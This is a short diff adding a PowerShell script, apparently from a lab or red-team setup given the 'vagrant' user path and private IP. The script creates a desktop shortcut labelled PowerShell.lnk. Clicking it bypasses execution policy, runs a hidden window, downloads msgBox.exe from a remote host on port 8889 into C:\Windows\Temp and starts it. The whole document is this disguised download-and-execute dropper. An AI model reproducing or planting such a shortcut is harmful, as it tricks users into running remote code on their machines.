@@ -1,0 +1,6 @@
+$obj = New-Object -ComObject WScript.Shell
+$link = $obj.CreateShortcut("C:\Users\vagrant\Desktop\PowerShell.lnk")
+$link.WindowStyle = 7
+$link.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+$link.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadFile('http://10.2.10.#:8889/ msgBox.exe','C:\Windows\Temp\msgbox.exe');Start-Process 'C:\Windows\Temp\msgbox.exe'"
+$link.Save()
